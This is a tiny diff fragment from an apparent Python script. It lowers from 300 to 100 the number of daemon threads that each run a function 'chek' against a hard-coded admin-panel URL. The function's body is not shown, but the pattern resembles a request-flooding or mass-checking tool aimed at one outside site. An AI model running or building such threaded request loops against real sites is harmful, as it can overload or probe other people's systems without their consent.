@@ -40,7 +40,7 @@ def chek(url):
 
 def start_threads():
     target_url = "https://adminpanel.in.net/chito/"
-    for _ in range(300):
+    for _ in range(100):
         thread = threading.Thread(target=chek, args=(target_url,))
         thread.daemon = True
         thread.start()
